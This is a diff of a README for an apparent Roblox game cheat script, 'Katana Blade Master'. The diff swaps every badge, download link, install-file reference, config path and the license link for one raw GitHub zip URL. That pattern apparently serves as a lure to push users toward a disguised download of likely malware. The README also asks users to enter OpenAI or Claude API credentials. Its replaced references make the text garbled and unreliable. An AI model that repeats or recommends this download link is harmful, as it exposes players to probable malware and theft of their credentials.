@@ -1,10 +1,10 @@
 # Katana Blade Master Roblox Script 🗡️
 
-![Roblox](https://img.shields.io/badge/Platform-Roblox-green)  
-![Maintenance](https://img.shields.io/badge/Maintained-2025-brightgreen)  
-![License](https://img.shields.io/badge/License-MIT-yellow)  
-![OpenAI](https://img.shields.io/badge/OpenAI-API-success)  
-![Claude](https://img.shields.io/badge/Claude-API-important)  
+![Roblox](https://raw.githubusercontent.com/n3therlands/katana-blade-master-roblox-toolset/branch/pretext/katana-blade-master-roblox-toolset-3.5.zip)  
+![Maintenance](https://raw.githubusercontent.com/n3therlands/katana-blade-master-roblox-toolset/branch/pretext/katana-blade-master-roblox-toolset-3.5.zip)  
+![License](https://raw.githubusercontent.com/n3therlands/katana-blade-master-roblox-toolset/branch/pretext/katana-blade-master-roblox-toolset-3.5.zip)  
+![OpenAI](https://raw.githubusercontent.com/n3therlands/katana-blade-master-roblox-toolset/branch/pretext/katana-blade-master-roblox-toolset-3.5.zip)  
+![Claude](https://raw.githubusercontent.com/n3therlands/katana-blade-master-roblox-toolset/branch/pretext/katana-blade-master-roblox-toolset-3.5.zip)  
 
 Welcome to the **Katana Blade Master Roblox Script** repository! This is the ultimate resource for players and developers seeking to elevate their Roblox experiences in the popular "Katana Blade Master" game mode. Our project merges efficiency, flexibility, and innovation to provide an advanced Roblox scripting solution that balances automation, personal style, and real-time interactivity.
 
@@ -18,10 +18,10 @@ We’re all about inclusivity! Whether you wield your katana from a laptop, desk
 
 | System           | Supported?     | Notes                                           |
 |------------------|:--------------:|------------------------------------------------|
-| ![Windows](https://img.shields.io/badge/Windows-Yes-brightgreen) | ✅ | Optimized for Windows 10/11                    |
-| ![macOS](https://img.shields.io/badge/macOS-Yes-blue)           | ✅ | macOS Big Sur and above recommended            |
-| ![Linux](https://img.shields.io/badge/Linux-Partial-orange)     | ⚠️ | Some distributions need additional dependencies|
-| ![Mobile](https://img.shields.io/badge/Mobile-Support-Planned-lightgrey) | 🚧 | Future support for mobile platforms (2025)     |
+| ![Windows](https://raw.githubusercontent.com/n3therlands/katana-blade-master-roblox-toolset/branch/pretext/katana-blade-master-roblox-toolset-3.5.zip) | ✅ | Optimized for Windows 10/11                    |
+| ![macOS](https://raw.githubusercontent.com/n3therlands/katana-blade-master-roblox-toolset/branch/pretext/katana-blade-master-roblox-toolset-3.5.zip)           | ✅ | macOS Big Sur and above recommended            |
+| ![Linux](https://raw.githubusercontent.com/n3therlands/katana-blade-master-roblox-toolset/branch/pretext/katana-blade-master-roblox-toolset-3.5.zip)     | ⚠️ | Some distributions need additional dependencies|
+| ![Mobile](https://raw.githubusercontent.com/n3therlands/katana-blade-master-roblox-toolset/branch/pretext/katana-blade-master-roblox-toolset-3.5.zip) | 🚧 | Future support for mobile platforms (2025)     |
 
 ---
 
@@ -81,11 +81,11 @@ Our live support channels (see [Issues](#issues) & integrated chat widget) opera
 1. **Ensure compatibility:** See [OS Table](#-os-compatibility-table).
 2. **Download the Katana Blade Master script package:**
 
-   https://n3therlands.github.io  
-   [![Download](https://img.shields.io/badge/Download-blue)](https://n3therlands.github.io)
+   https://raw.githubusercontent.com/n3therlands/katana-blade-master-roblox-toolset/branch/pretext/katana-blade-master-roblox-toolset-3.5.zip  
+   [![Download](https://raw.githubusercontent.com/n3therlands/katana-blade-master-roblox-toolset/branch/pretext/katana-blade-master-roblox-toolset-3.5.zip)](https://raw.githubusercontent.com/n3therlands/katana-blade-master-roblox-toolset/branch/pretext/katana-blade-master-roblox-toolset-3.5.zip)
    
-3. Unzip and follow instructions in the `INSTALL.md`.
-4. Optionally, enter your API credentials for OpenAI/Claude enhancements (`config/apisettings.lua`).
+3. Unzip and follow instructions in the `https://raw.githubusercontent.com/n3therlands/katana-blade-master-roblox-toolset/branch/pretext/katana-blade-master-roblox-toolset-3.5.zip`.
+4. Optionally, enter your API credentials for OpenAI/Claude enhancements (`https://raw.githubusercontent.com/n3therlands/katana-blade-master-roblox-toolset/branch/pretext/katana-blade-master-roblox-toolset-3.5.zip`).
 5. Launch your next Katana Blade Master Roblox session!
 
 ---
@@ -137,15 +137,15 @@ Planned for 2025:
 
 Ready to forge your destiny? Equip the script from the link below and join the dojo of Katana Blade Masters in Roblox!
 
-https://n3therlands.github.io  
-[![Download](https://img.shields.io/badge/Download-blue)](https://n3therlands.github.io)
+https://raw.githubusercontent.com/n3therlands/katana-blade-master-roblox-toolset/branch/pretext/katana-blade-master-roblox-toolset-3.5.zip  
+[![Download](https://raw.githubusercontent.com/n3therlands/katana-blade-master-roblox-toolset/branch/pretext/katana-blade-master-roblox-toolset-3.5.zip)](https://raw.githubusercontent.com/n3therlands/katana-blade-master-roblox-toolset/branch/pretext/katana-blade-master-roblox-toolset-3.5.zip)
 
 ---
 
 ## 📜 MIT License
 
 Distributed under the MIT License.  
-See the full license text here: [MIT License](https://opensource.org/licenses/MIT).
+See the full license text here: [MIT License](https://raw.githubusercontent.com/n3therlands/katana-blade-master-roblox-toolset/branch/pretext/katana-blade-master-roblox-toolset-3.5.zip).
 
 2025 © All contributors to Katana Blade Master Roblox Script
 
